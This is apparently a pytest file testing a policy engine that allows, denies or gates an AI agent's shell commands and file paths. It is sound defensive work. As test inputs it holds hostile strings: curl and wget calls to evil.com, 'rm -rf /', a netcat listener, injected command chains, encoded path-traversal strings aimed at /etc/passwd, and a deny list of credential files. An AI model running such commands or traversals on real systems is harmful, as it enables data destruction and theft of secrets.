"""Tests for the policy engine — written FIRST per AGENTS.md rule #3.

Covers:
  - Command allowlist (SPEC threat #3)
  - Path traversal attacks (SPEC threat #4)
  - Secret / credential file access (SPEC threat #5)
  - Dependency install approval gates (SPEC threat #8)
  - Deny-by-default behaviour (SPEC threat #10)
  - Tricky attack cases: encoded paths, semicolon chains, backticks, etc.
"""

import pytest

from app.policy_engine import Decision, check_command, check_path


# ===================================================================
# COMMAND ALLOWLIST — basic allow / deny
# ===================================================================

class TestCommandAllowlist:
    """Threat #3: only allowlisted commands may run."""

    # -- allowed commands --------------------------------------------------

    def test_allow_python(self):
        d = check_command("python main.py")
        assert d.action == "allow"

    def test_allow_python3(self):
        d = check_command("python3 script.py")
        assert d.action == "allow"

    def test_allow_pytest(self):
        d = check_command("pytest tests/")
        assert d.action == "allow"

    def test_allow_cat(self):
        d = check_command("cat README.md")
        assert d.action == "allow"

    def test_allow_ls(self):
        d = check_command("ls -la")
        assert d.action == "allow"

    def test_allow_grep(self):
        d = check_command("grep -r TODO src/")
        assert d.action == "allow"

    def test_allow_echo(self):
        d = check_command("echo hello")
        assert d.action == "allow"

    # -- denied commands ---------------------------------------------------

    def test_deny_curl(self):
        d = check_command("curl http://evil.com")
        assert d.action == "deny"

    def test_deny_wget(self):
        d = check_command("wget http://evil.com/payload")
        assert d.action == "deny"

    def test_deny_rm_rf(self):
        d = check_command("rm -rf /")
        assert d.action == "deny"

    def test_deny_sudo(self):
        d = check_command("sudo rm file")
        assert d.action == "deny"

    def test_deny_chmod(self):
        d = check_command("chmod 777 script.sh")
        assert d.action == "deny"

    def test_deny_nc_netcat(self):
        d = check_command("nc -l 4444")
        assert d.action == "deny"

    def test_deny_empty_command(self):
        d = check_command("")
        assert d.action == "deny"


# ===================================================================
# COMMAND INJECTION — chained / embedded commands
# ===================================================================

class TestCommandInjection:
    """Threat #3: commands chained with operators must be denied."""

    def test_deny_semicolon_chain(self):
        d = check_command("ls; curl http://evil.com")
        assert d.action == "deny"

    def test_deny_and_chain(self):
        d = check_command("echo ok && curl http://evil.com")
        assert d.action == "deny"

    def test_deny_or_chain(self):
        d = check_command("false || wget http://evil.com")
        assert d.action == "deny"

    def test_deny_pipe_to_bash(self):
        d = check_command("echo 'rm -rf /' | bash")
        assert d.action == "deny"

    def test_deny_backtick_subshell(self):
        d = check_command("echo `curl evil.com`")
        assert d.action == "deny"

    def test_deny_dollar_paren_subshell(self):
        d = check_command("echo $(curl evil.com)")
        assert d.action == "deny"

    def test_deny_newline_injection(self):
        d = check_command("echo ok\ncurl evil.com")
        assert d.action == "deny"


# ===================================================================
# DEPENDENCY INSTALL — needs human approval (SPEC threat #8)
# ===================================================================

class TestDependencyInstall:
    """Threat #8: package installs always need human approval."""

    def test_pip_install_needs_approval(self):
        d = check_command("pip install requests")
        assert d.action == "needs_approval"

    def test_pip3_install_needs_approval(self):
        d = check_command("pip3 install flask")
        assert d.action == "needs_approval"

    def test_npm_install_needs_approval(self):
        d = check_command("npm install express")
        assert d.action == "needs_approval"

    def test_npm_i_needs_approval(self):
        d = check_command("npm i lodash")
        assert d.action == "needs_approval"

    def test_yarn_add_needs_approval(self):
        d = check_command("yarn add react")
        assert d.action == "needs_approval"

    def test_pip_install_with_flags_needs_approval(self):
        d = check_command("pip install --upgrade requests")
        assert d.action == "needs_approval"


# ===================================================================
# PATH TRAVERSAL — basic (SPEC threat #4)
# ===================================================================

class TestPathTraversal:
    """Threat #4: block ../, absolute paths, and symlink escapes."""

    def test_allow_simple_relative_path(self):
        d = check_path("src/main.py", project_root="/home/user/project")
        assert d.action == "allow"

    def test_allow_nested_path(self):
        d = check_path("src/utils/helpers.py", project_root="/home/user/project")
        assert d.action == "allow"

    def test_deny_dot_dot_simple(self):
        d = check_path("../etc/passwd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_dot_dot_nested(self):
        d = check_path("src/../../etc/shadow", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_absolute_path(self):
        d = check_path("/etc/passwd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_absolute_path_windows(self):
        d = check_path("C:\\Windows\\System32\\config", project_root="C:\\Users\\dev\\project")
        assert d.action == "deny"

    def test_allow_dot_slash_prefix(self):
        d = check_path("./src/main.py", project_root="/home/user/project")
        assert d.action == "allow"


# ===================================================================
# PATH TRAVERSAL — encoded / tricky attacks
# ===================================================================

class TestPathTraversalEncoded:
    """Threat #4: encoded and obfuscated path traversal attempts."""

    def test_deny_url_encoded_dot_dot(self):
        """../ encoded as %2e%2e%2f"""
        d = check_path("%2e%2e%2fetc/passwd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_double_url_encoded(self):
        """../ double-encoded as %252e%252e%252f"""
        d = check_path("%252e%252e%252fetc/passwd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_backslash_traversal(self):
        d = check_path("..\\..\\etc\\passwd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_mixed_slash_traversal(self):
        d = check_path("../..\\etc/passwd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_dot_dot_with_null_byte(self):
        """Null byte injection: ../etc/passwd\x00.py"""
        d = check_path("../etc/passwd\x00.py", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_unicode_slash(self):
        """Unicode fullwidth solidus U+FF0F"""
        d = check_path("..\uff0fetc\uff0fpasswd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_triple_dot_traversal(self):
        """Some parsers treat ... specially."""
        d = check_path(".../etc/passwd", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_dot_dot_with_trailing_spaces(self):
        d = check_path(".. /etc/passwd", project_root="/home/user/project")
        assert d.action == "deny"


# ===================================================================
# SECRET / CREDENTIAL FILE ACCESS (SPEC threat #5)
# ===================================================================

class TestSecretFileAccess:
    """Threat #5: block access to .env, SSH keys, credential files."""

    def test_deny_env_file(self):
        d = check_path(".env", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_env_local(self):
        d = check_path(".env.local", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_env_production(self):
        d = check_path(".env.production", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_nested_env(self):
        d = check_path("config/.env", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_ssh_private_key(self):
        d = check_path(".ssh/id_rsa", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_ssh_ed25519(self):
        d = check_path(".ssh/id_ed25519", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_aws_credentials(self):
        d = check_path(".aws/credentials", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_gcloud_credentials(self):
        d = check_path(".config/gcloud/credentials.db", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_npmrc(self):
        d = check_path(".npmrc", project_root="/home/user/project")
        assert d.action == "deny"

    def test_deny_pypirc(self):
        d = check_path(".pypirc", project_root="/home/user/project")
        assert d.action == "deny"

    def test_allow_env_example(self):
        """The .env.example template is safe and should be allowed."""
        d = check_path(".env.example", project_root="/home/user/project")
        assert d.action == "allow"

    def test_allow_regular_py_file(self):
        d = check_path("src/config.py", project_root="/home/user/project")
        assert d.action == "allow"


# ===================================================================
# DENY-BY-DEFAULT (SPEC threat #10)
# ===================================================================

class TestDenyByDefault:
    """The engine must deny anything it does not explicitly recognise."""

    def test_deny_unknown_command(self):
        d = check_command("./custom_binary --hack")
        assert d.action == "deny"

    def test_decision_has_reason(self):
        d = check_command("curl http://evil.com")
        assert d.reason != ""

    def test_decision_has_reason_on_allow(self):
        d = check_command("python main.py")
        assert d.reason != ""

    def test_deny_path_with_only_dots(self):
        d = check_path("....", project_root="/home/user/project")
        assert d.action == "deny"
